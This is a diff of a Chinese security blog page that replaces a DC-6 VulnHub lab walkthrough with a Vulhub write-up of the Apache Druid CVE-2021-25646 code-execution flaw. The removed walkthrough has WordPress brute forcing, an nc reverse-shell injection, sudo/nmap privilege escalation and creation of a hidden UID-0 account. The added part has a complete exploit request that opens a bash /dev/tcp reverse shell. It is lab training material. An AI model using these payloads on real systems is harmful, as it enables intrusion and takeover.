@@ -17,7 +17,7 @@
     <meta name="keywords" content="G00dddd">
 
 
-<title>DC-6 | G00d`s Blog</title>
+<title>Vulhub-5.apache-druid | G00d`s Blog</title>
 
 
 
@@ -390,7 +390,7 @@
     
     <article class="post-wrap">
         <header class="post-header">
-            <h1 class="post-title">DC-6</h1>
+            <h1 class="post-title">Vulhub-5.apache-druid</h1>
             
                 <div class="post-meta">
                     
@@ -399,14 +399,14 @@
 
                     
                         <span class="post-time">
-                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:06:26</a>
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:21:11</a>
                         </span>
                     
                     
                         <span class="post-category">
                     Category:
                             
-                                <a href="../categories/Vulnhub/">Vulnhub</a>
+                                <a href="../categories/Vulhub/">Vulhub</a>
                             
                         </span>
                     
@@ -415,49 +415,41 @@
         </header>
 
         <div class="post-content">
-            <h1 id="DC-6"><a href="#DC-6" class="headerlink" title="DC-6"></a>DC-6</h1><p>第一步信息收集</p>
-<p><img src="/dc-6//1.png" alt="1"></p>
-<p>192.168.213.158</p>
-<p><img src="/dc-6//2.png" alt="2"></p>
-<p>Vi &#x2F;etc&#x2F;hosts 把重定向加上就行了</p>
-<p>接着扫目录发现跟之前打过的靶机有点像</p>
-<p><img src="/dc-6//3.png" alt="3"></p>
-<p><img src="/dc-6//4.png" alt="4"></p>
-<p>用wpscan(专门搜索wordpross漏洞)再看看</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a></p>
-<p><img src="/dc-6//5.png" alt="5"></p>
-<p>用wpscan枚举一下用户名</p>
-<p>Wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> –enumerate u</p>
-<p><img src="/dc-6//6.png" alt="6"></p>
-<p>爆出几个账号,cat &gt; 1.txt 保存一下,然后wpscan –url <a target="_blank" rel="noopener" href="http://wordy/">http://wordy</a> -U 1.txt -P rockyou.txt</p>
-<p><img src="/dc-6//7.png" alt="7"></p>
-<p>Url&#x2F;wp-login.php 登录后台发现activity monitor</p>
-<p>用searchsploit activity monitor</p>
-<p><img src="/dc-6//8.png" alt="8"></p>
-<p><img src="/dc-6//../../../../%E5%88%B7%E9%A2%98/%E6%9C%AC%E5%9C%B0/vulnhub/media/image9.png"><img src="/dc-6//9.png" alt="9">这里有命令执行,127.0.0.1|nc -e &#x2F;bin&#x2F;bash 192.168.213.137 9999</p>
-<p><img src="/dc-6//10.png" alt="10"></p>
-<p>拿到普通权限</p>
-<p>Python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</p>
-<p>在主机内部找信息</p>
-<p><img src="/dc-6//11.png" alt="11"></p>
-<p>Ssh <a href="mailto:&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;">&#103;&#x72;&#97;&#104;&#x61;&#109;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#x38;&#46;&#50;&#x31;&#x33;&#x2e;&#x31;&#x35;&#56;</a></p>
-<p>提权</p>
-<p><img src="/dc-6//12.png" alt="12"></p>
-<p>我们发现当前账号对backups.sh读写操作</p>
-<p>把shell写入backups</p>
-<p>Echo “&#x2F;bin&#x2F;bash” &gt;&gt; backups.sh</p>
-<p>Sudo -u jens .&#x2F;backups.sh &#x2F;&#x2F;这里用jens执行backups</p>
-<p><img src="/dc-6//13.png" alt="13"></p>
-<p>发现切换账号成功</p>
-<p>Sudo -l发现jens可以用root执行nmap,那就用nmap提权</p>
-<p><img src="/dc-6//14.png" alt="14"></p>
-<p>需要先看nmap的版本号 nmap -v</p>
-<p>然后把shell写入”shell”里,用nmap执行</p>
-<p>echo ‘os.execute(“&#x2F;bin&#x2F;sh”)’ &gt; shell</p>
-<p>sudo nmap –script&#x3D;shell</p>
-<p><img src="/dc-6//15.png" alt="15"></p>
-<p>添加root账号</p>
-<p>useradd -u 0 -o -g 0 -G root -s &#x2F;bin&#x2F;bash -d &#x2F;home&#x2F;root1-m root1</p>
+            <h1 id="Apache-Druid"><a href="#Apache-Druid" class="headerlink" title="Apache Druid"></a>Apache Druid</h1><h2 id="代码执行漏洞（CVE-2021-25646）"><a href="#代码执行漏洞（CVE-2021-25646）" class="headerlink" title="代码执行漏洞（CVE-2021-25646）"></a>代码执行漏洞（CVE-2021-25646）</h2><blockquote>
+<p>Apache Druid &lt; 0.20.1</p>
+</blockquote>
+<p>Druid不仅是一个数据库连接池，还包含一个ProxyDriver、一系列内置的JDBC组件库、一个SQL Parser。</p>
+<p>支持所有JDBC兼容的数据库，包括Oracle、MySql、Derby、Postgresql、SQL Server、H2等。</p>
+<p>Apache Druid 包括执行用户提供的 JavaScript 的功能嵌入在各种类型请求中的代码。此功能在用于高信任度环境中，默认已被禁用。但是，在 Druid 0.20.0 及更低版本中，经过身份验证的用户可以构造传入的json串来控制一些敏感的参数发送恶意请求，利用 Apache Druid 漏洞可以执行任意代码。</p>
+<p>服务启动后，访问`<a target="_blank" rel="noopener" href="http://your-ip:8888/%60%E5%8D%B3%E5%8F%AF%E6%9F%A5%E7%9C%8B%E5%88%B0Apache">http://your-ip:8888\`即可查看到Apache</a> Druid主页。</p>
+<p><img src="/vulhub-5-apache-druid//1.png" alt="1"></p>
+<p>抓包</p>
+<p><img src="/vulhub-5-apache-druid//2.png" alt="2"></p>
+<p>发到重放器,修改成post,请求地址 &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler,也可以是druid&#x2F;indexer&#x2F;v1&#x2F;sampler?for&#x3D;filter</p>
+<p><img src="/vulhub-5-apache-druid//3.png"><img src="/vulhub-5-apache-druid//4.png"><img src="/vulhub-5-apache-druid//5.png" alt="5"><img src="/vulhub-5-apache-druid//6.png" alt="6"></p>
+<p><img src="/vulhub-5-apache-druid//7.png" alt="7"></p>
+<p>exec(‘&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.4&#x2F;4444 0&gt;&amp;1’)</p>
+<p>POST &#x2F;druid&#x2F;indexer&#x2F;v1&#x2F;sampler?for&#x3D;filter HTTP&#x2F;1.1</p>
+<p>Host: 192.168.213.150:8888</p>
+<p>Content-Length: 716</p>
+<p>Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;115.0.5790.171 Safari&#x2F;537.36</p>
+<p>Content-Type: application&#x2F;json;charset&#x3D;UTF-8</p>
+<p>Origin: <a target="_blank" rel="noopener" href="http://192.168.213.150:8888/">http://192.168.213.150:8888</a></p>
+<p>Referer: <a target="_blank" rel="noopener" href="http://192.168.213.150:8888/unified-console.html">http://192.168.213.150:8888/unified-console.html</a></p>
+<p>Accept-Encoding: gzip, deflate</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Connection: close</p>
+<p>{“type”:”index”,”spec”:{“type”:”index”,”ioConfig”:{“type”:”index”,”firehose”:{“type”:”local”,”baseDir”:”quickstart&#x2F;tutorial&#x2F;“,”filter”:”wikiticker-2015-09-12-sampled.json.gz”}},”dataSchema”:{“dataSource”:”sample”,”parser”:{“type”:”string”,”parseSpec”:{“format”:”json”,”timestampSpec”:{“column”:”time”,”format”:”iso”},”dimensionsSpec”:{}}},”transformSpec”:{“transforms”:[],”filter”:{“type”:”javascript”,”function”:”function(value){return java.lang.Runtime.getRuntime().exec(‘&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.4&#x2F;4444 0&gt;&amp;1’)}”,</p>
+<p> </p>
+<p>“dimension”:”added”,</p>
+<p> </p>
+<p>“”:{</p>
+<p> </p>
+<p>“enabled”:”true”}</p>
+<p> </p>
+<p>}}}},”samplerConfig”:{“numRows”:500,”timeoutMs”:15000,”cacheKey”:”4ddb48fdbad7406084e37a1b80100214”}}</p>
+<p>exec(‘&#x2F;bin&#x2F;bash -c $@|bash 0 echo bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.4&#x2F;4444 0&gt;&amp;1’)</p>
 
         </div>
 
@@ -494,10 +486,10 @@
         </section>
         <section class="post-nav">
             
-                <a class="prev" rel="prev" href="../dc-7/">DC-7</a>
+                <a class="prev" rel="prev" href="../vulhub-6-apereocas/">Vulhub-6.ApereoCAS</a>
             
             
-            <a class="next" rel="next" href="../dc-5/">DC-5</a>
+            <a class="next" rel="next" href="../vulhub-4-aj-report/">Vulhub-4.AJ-Report</a>
             
         </section>
 
